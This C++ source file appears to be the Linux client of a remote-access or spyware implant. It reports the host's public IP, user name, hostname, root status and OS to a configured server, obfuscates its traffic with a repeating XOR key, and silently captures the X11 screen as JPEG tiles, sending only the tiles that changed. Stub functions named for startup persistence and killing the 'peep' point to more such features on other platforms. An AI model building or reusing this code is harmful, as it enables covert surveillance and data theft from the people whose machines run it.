#include "analyze.h"
#include "http.h"
#include "protocol.h"

#include <sys/utsname.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <jpeglib.h>


#pragma warning(disable:4996)


using namespace nlohmann;

const string DEC_ASCII            = "0123456789ABCDEF";

string operator * (string a, int b) {
    string output = "";
    if (b < 0) {
        return output;
    }

    while (b--) {
        output += a;
    }
    return output;
}


string rJsonQuots(const string& str) {
    if (str.size() >= 2 && str.front() == '"' && str.back() == '"') {
        return str.substr(1, str.size() - 2);
    }
    return str;
}


string random_ascii(int lng, string payload) {

    string      result;
    string p = payload.empty() ? DEC_ASCII : payload;
    int range = p.length();
    // init random integer
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int> dis(0, range - 1);

    for (int i = 0; i < lng; i++) {
        result += p[dis(gen) % range];
    }
    return result;

}


json get_setting_from_server(){
    http _http(SERVER.c_str(), 80, "/HostServer", "key=" + API_KEY);
    json result = _http.post();

    return result;
}


/* [heap/f] clean */
string get_public_ip() {
    
    http _http = http("ipinfo.io", 80, "/ip");
    string ip = _http.get();
    return ip;
}


/* [f] clean */
string pGetlogin() {
    char* login = getlogin();
    if (login == nullptr){
        return "unknown";
    }
    return string(login);
}


/* [f] clean */
string t_gethostname() {
    char hostname[256];

    if (gethostname(hostname, sizeof(hostname)) != 0){
        return "unknown";
    }
    return hostname;
}


bool is_elevated_access(){
    return geteuid() == 0;
}

string get_platform_name(){
    struct utsname platform;

    if (uname(&platform) !=0 ){
        return "unknown";
    }
    string sysname = platform.sysname;
    //string machine = platform.;
    string release = platform.release;

    return sysname + " " + release;
}

string B2Hex::a2b_hex(const string& hex) {
    std::string bin_string;
    for (int i = 0; i < hex.length(); i += 2)
    {
        bin_string += (hex[i] >= 'A' ? hex[i] - 'A' + 10 : hex[i] -
            '0') * 16 +
            (hex[i + 1] >= 'A' ? hex[i + 1] - 'A' + 10 : hex[i + 1] -
                '0');
    }
    return bin_string;

}

/* [f] clean */
string B2Hex::b2a_hex(const string& str) {

    std::string hex_string;
    for (int i = 0; i < str.length(); ++i)
    {
        unsigned char index = str[i];
        // High half
        hex_string += DEC_ASCII[(index >> 4) & 0x0F];
        hex_string += DEC_ASCII[index & 0x0F];
    }
    return hex_string;
}

// [f] clean, but need deallocate after this function!
char* x0r(string key, char* value, size_t x0rlen) {
    char* result = new char[x0rlen+1];
    string _key = key + (key.substr(0, 1) * int(x0rlen - key.length()));
    for (size_t i = 0; i < x0rlen; i++) {
        result[i] = value[i] ^ _key[i];
    }
    // null;
    result[x0rlen] = '\0';

    return result;
}


pair<json, char*> GetBlockPacket(char* packet, size_t lpacket, bool ignore) {
    /*
        packet memory going to delete if packet valid,
        so no need deallocate after call this function
    */

    // #1: verify length package
    if (lpacket == 0  || packet == nullptr) {
        if (!ignore) {
            throw (PACKET_ERROR_I);
        }
        packet = nullptr;
        return BLOCK_ERROR;
    }

 
    try {
        // #2: split package to two char* pointers
        list<pair<unsigned int, char*>> _packet = split42chars(packet, S_KEY, lpacket);
        // #3: verify size of pair object
        if (_packet.size() == 0) {
            return BLOCK_ERROR;
        }
        // #4: decrypt part 1 of package <json>
        char* json_dec = x0r(KEY_XOR, _packet.front().second, _packet.front().first);
        // #5: char* to json object
        json json_pack = json::parse(json_dec);
        // #6: cleanup part 1
        delete[] _packet.front().second;
        delete[] json_dec;
        _packet.pop_front();
        // #7: decrypt part 2 of package <binary>
        char* binary = x0r(KEY_XOR, _packet.front().second, _packet.front().first);
        // #8: cleanup part 2 of package <binary>
        delete[] _packet.front().second;
        _packet.pop_front();
        
        // SUCCESS
        return make_pair(json_pack, binary);
    }
    catch (json::exception& err) {
        if (!ignore) { throw(PACKET_ERROR_I); }
        return BLOCK_ERROR;
    }
    catch(exception&err){
        return BLOCK_ERROR;
    }
    return BLOCK_ERROR;
}


char* SetBlockPacket(json info, char* binary, size_t lbinary, size_t&size_packet) {
    if (binary == nullptr) {
        lbinary = strlen(EMPTY);
        binary = new char[lbinary+1];
 
        memcpy(binary, EMPTY, lbinary);
        binary[lbinary] = '\0';
    }
    // #1: json to string 
    string dump_json = info.dump();
    // #2: length of json
    size_t ljson = dump_json.length();
    // #3: string to const char*
    char* d_json = new char[ljson+1];
    memcpy(d_json, dump_json.c_str(), ljson);
    d_json[ljson] = '\0';
    // #4: encrypt part 1 of package <json>
    char* json_encrypt = x0r(KEY_XOR, d_json, ljson);
    // #5: encrypt part 2 of package <binary>
    char* binary_ancrypt = x0r(KEY_XOR, binary, lbinary);
    size_packet = ljson + lbinary + strlen(S_KEY);
    // cleanup
    delete[] d_json;
    delete[] binary;
    // SUCCESS
    return concatenate3chars_proto(json_encrypt, binary_ancrypt, ljson, lbinary);

}

char* subchar(char* memb, unsigned int start, unsigned int stop, size_t ln) {

    unsigned int starter = 0;
    unsigned int _stop = (ln <= stop) ? ln : stop;
    size_t ll = _stop - start;
    char* result = new char[ll + 1];
    for (unsigned int i{ start }; i < _stop; i++) {
        result[starter] = memb[i];
        starter += 1;
    }
    result[ll] = '\0';
    return result;

}


list<pair<unsigned int, char*>> split42chars(char* memb, const char* delimiter, size_t l) {
   
    list<pair<unsigned int, char*>> result;
    size_t dlen = strlen(delimiter);
    unsigned int index = 0;
    for (unsigned int i = 0; i < l; i++) {
        char* part_buffer = subchar(memb, i, i + dlen, l);
        if (strcmp(delimiter, part_buffer) == 0) {
            pair<unsigned int, char*> _(i, subchar(memb, 0, i, l));
            result.push_back(_);
            index = i;
            delete[] part_buffer;
            break;
        }
        delete[] part_buffer;
      

    }
    pair<unsigned int, char*> _((l - index)- dlen, subchar(memb, index + dlen, l, l));
    result.push_back(_);
    //celanup
    delete[] memb;
    return result;
}


char* concatenate3chars_proto(const char* _json, const char* binary, size_t lj, size_t lb) {
    size_t lkey = strlen(S_KEY);
    size_t lenbuffer = lj + lb + lkey;
    char* buffer = new char[lenbuffer+1];
    // copy #1
    memcpy(buffer, _json, lj);
    // copy #2
    memcpy(buffer+lj, S_KEY, lkey);
    // copy #3
    memcpy(buffer + lj + lkey, binary, lb);
    buffer[lenbuffer] = '\0';
    // cleanup
    delete[] _json;
    delete[] binary;
    return buffer;
} 


/* [f] clean */
char* concatenate_to_char_ptr(list<pair<size_t, char*>>& binary, size_t lbuffer, bool deallocate) {
    // #1: allocate buffer
    char* membuffer = new char[lbuffer];
    memset(membuffer, 0, lbuffer);
    // #2:  pointing to poistion of source buffer
    char* buffer_position = membuffer;
    // #3: start write to memory buffer from #1 
    for (const auto& tpair : binary) {
        // #1: get size
        size_t length_block = tpair.first;
        // #2: get buffer block
        // #3: copy from source "block"
        memcpy(buffer_position, tpair.second, length_block);
        // #4: pointing to new postion on memory of a buffer 
        buffer_position += length_block;
    }

    // cleanup
    if (deallocate) {
        deallocate_receive_proto(binary);
    }

    // SUCCESS     
    return membuffer;
    

}

void deallocate_receive_proto(list<pair<size_t, char*>>&packet) {

    for (auto& part2 : packet) {
        if (part2.second != nullptr) { delete[] part2.second; }
    }
    packet.clear();

}


pair<size_t, list<pair<size_t, char*>>> set_X_parts_image(map<string, pair<size_t, char*>>&package, int q, int xb, int w, int h){
    int index = 0;
    size_t image_size = 0;
    list<pair<size_t, char*>> img;
    for (int x = 0; x < xb; x++) {
        for (int y=0; y < xb; y++) {
            int l = y * (w / xb);
            int t = x * (h / xb);
            pair<size_t, char*> image_buffer = get_img_24_bit_jpg(0, 0, q, true, l, t, l + (w / xb), t + (h / xb));

            // verify size of image
            if (image_buffer.first == 0) { return make_pair(0, img); }
            // start
            string _index = to_string(index);
            size_t ib = image_buffer.first;
            size_t p = package[_index].first;

            if (ib <= p-MIN_CHANGE_FRM || ib >= p+MIN_CHANGE_FRM) {
            //if (ib != p){
                if (package[_index].second != nullptr) {
                    delete[]package[_index].second;
                    package[_index].second = nullptr;
                }
                // allocate the new buffer from image to package
                // update size of buffer on package
                package[_index].first = ib;
                // #1: copy to package
                package[_index].second = new char[ib];
                memcpy(package[_index].second, image_buffer.second, ib);
                img.push_back(make_pair(ib, image_buffer.second));
                image_size += ib;
            }
            else{
                size_t bl = strlen(BLOCK_FRM);
                size_t blAlloc = bl+1;
                char* frm = new char[blAlloc];
                memcpy(frm, BLOCK_FRM, bl);
                frm[bl] = '\0';
                pair<size_t, char*> block = make_pair(strlen(frm), frm);
                img.push_back(block);
                image_size += bl;
                // because 
                free(image_buffer.second);
            }
            index += 1;
        }
        
    }
    return make_pair(image_size, img);
}



pair<size_t, char*> get_img_24_bit_jpg(int _w, int _h, int quality, bool v, int l, int t,int r,int b){

    unsigned char* _xptr_img = nullptr;
    pair<size_t, char*> pBuffer = make_pair(0, nullptr);

    Display *display = XOpenDisplay(nullptr);
    if (!display){
        return pBuffer;
    }

    Window wRoot = DefaultRootWindow(display);
    XWindowAttributes wAttr;
    XGetWindowAttributes(display, wRoot, &wAttr);
    int width = !_w ? r - l : _w; 
    int height = !_h ? b - t : _h;

    
    XVisualInfo vinfo;
    vinfo.visual = CopyFromParent;
    vinfo.depth = 24;
    vinfo.bits_per_rgb = 8;
    int status = XMatchVisualInfo(display, XDefaultScreen(display), 24, TrueColor, &vinfo);
    if (!status){XCloseDisplay(display);return pBuffer;}

    XImage* image = XGetImage(display, wRoot, l, t, width, height, AllPlanes, ZPixmap);

    if (!image){
        XCloseDisplay(display);
        return pBuffer;
    }
    
    // GET jpg format
    struct jpeg_compress_struct cInfo;
    struct jpeg_error_mgr jError;
    cInfo.err = jpeg_std_error(&jError);
    jpeg_create_compress(&cInfo);

    // pointer of data()
    jpeg_mem_dest(&cInfo, &_xptr_img, &pBuffer.first);
    cInfo.image_width = width;
    cInfo.image_height = height;
    cInfo.input_components = 4;
    cInfo.in_color_space = JCS_EXT_RGBA;

    jpeg_set_defaults(&cInfo);
    jpeg_set_quality(&cInfo, quality, TRUE);
    jpeg_start_compress(&cInfo, TRUE);

    JSAMPROW row_pointer[1];
    while (cInfo.next_scanline < cInfo.image_height) {
        row_pointer[0] = &((unsigned char*)image->data)[cInfo.next_scanline * image->bytes_per_line];
        (void)jpeg_write_scanlines(&cInfo, row_pointer, 1);
    }

    jpeg_finish_compress(&cInfo);
    jpeg_destroy_compress(&cInfo);

    // cleanup
    XDestroyImage(image);
    XCloseDisplay(display);

    // reinterpret
    pBuffer.second = reinterpret_cast<char*>(_xptr_img);
    if (v) {
        size_t bLength = strlen(BLOCK_FRM);
        size_t bLengthAlloc = bLength+1;
        char* _ybuffer_ptr = static_cast<char*>(realloc(pBuffer.second, pBuffer.first+bLengthAlloc));
        if (_ybuffer_ptr == nullptr) {
            free(pBuffer.second);
            pBuffer.second = nullptr;
            return make_pair(0, nullptr);
        }
    
        pBuffer.second = _ybuffer_ptr;
        memcpy(pBuffer.second + pBuffer.first, BLOCK_FRM, bLength);
        pBuffer.first += bLength;
        pBuffer.second[pBuffer.first] = '\0';
    }

    //
    return pBuffer;
}




pair<char*, char*> get_tempfile(){
    return make_pair(nullptr,nullptr);
}

unsigned int set_startup_peep(){
    return 0;
}

bool is_set_startup(){
    return 0;
}

int getPeepName(wchar_t* tn){
    return 0;
}

int kill_peep(){
    return 0;
}

pair<int, int>GetWindowSize(){
    pair<int, int> wSize = make_pair(1920, 1080);
    Display *display = XOpenDisplay(nullptr);
    if (!display){
        return wSize;
    }
    Window wRoot = DefaultRootWindow(display);
    XWindowAttributes wAttr;
    XGetWindowAttributes(display, wRoot, &wAttr);
    XCloseDisplay(display);

    return make_pair(wAttr.width, wAttr.height);
}